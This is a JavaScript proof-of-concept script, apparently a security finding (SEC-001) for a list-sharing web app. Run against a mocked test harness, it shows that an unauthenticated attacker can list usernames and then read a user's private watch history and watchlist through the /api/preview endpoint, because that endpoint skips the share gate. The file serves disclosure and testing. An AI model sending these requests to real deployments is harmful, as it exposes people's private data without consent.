// SEC-001 end-to-end: username enumeration -> private watch history.
// No account, no credential, two unauthenticated GETs.
import { makeEnv, makeKv, makeD1, call, createUser } from "../../tests/harness.mjs";
const env = makeEnv({ CONFIGS: makeKv(), DB: makeD1() });

const v = await createUser(env, "alice-films");
// alice publishes ONE ordinary public list -- the only thing she chose to share.
await call(env, "/api/creator/lists/save", { method: "POST", json: {
  creatorName: "alice-films", creatorKey: v.creatorKey,
  name: "Best Westerns", type: "movie", visibility: "public",
  items: [{ id: "tt0060196", name: "The Good, the Bad and the Ugly" }],
}});
// and privately tracks what she watches. Sharing is OFF (the default).
await call(env, "/api/creator/sync/save-tracking", { method: "POST", json: {
  creatorName: "alice-films", creatorKey: v.creatorKey,
  watchHistory: [{ id: "tt0096697:12:9", showId: "tt0096697", showTitle: "Something Personal", seasonNum: 12, episodeNum: 9, watchedAt: 1 }],
  watchlist: [{ id: "tt0000009", name: "Also Personal", type: "movie" }],
}});
const shared = await call(env, "/api/creator/sync/share-tracking", { method: "POST",
  json: { creatorName: "alice-films", creatorKey: v.creatorKey } });
console.log("1. alice's sharing settings:", JSON.stringify(shared.body.shared));

// --- ATTACKER ---------------------------------------------------------------
const dir = await call(env, "/lists/public.json");
console.log("2. GET /lists/public.json  -> usernames:",
  JSON.stringify((dir.body.lists || []).map(l => l.creator)));

// The share gate IS enforced on the public list page:
const gated = await call(env, "/lists/alice-films/watch-history.json");
console.log("3. GET /lists/alice-films/watch-history.json ->", gated.status,
  JSON.stringify(gated.body).slice(0, 90));

// ...and NOT on /api/preview:
for (const [slug, type] of [["watch-history","series"],["watchlist","movie"]]) {
  const r = await call(env, "/api/preview?type=" + type + "&url=" +
    encodeURIComponent(`autotrack:${slug}:${type}:alice-films`));
  console.log(`4. GET /api/preview autotrack:${slug} -> ${r.status}`,
    "ACAO=" + r.headers.get("access-control-allow-origin"),
    JSON.stringify(r.body.sample));
}
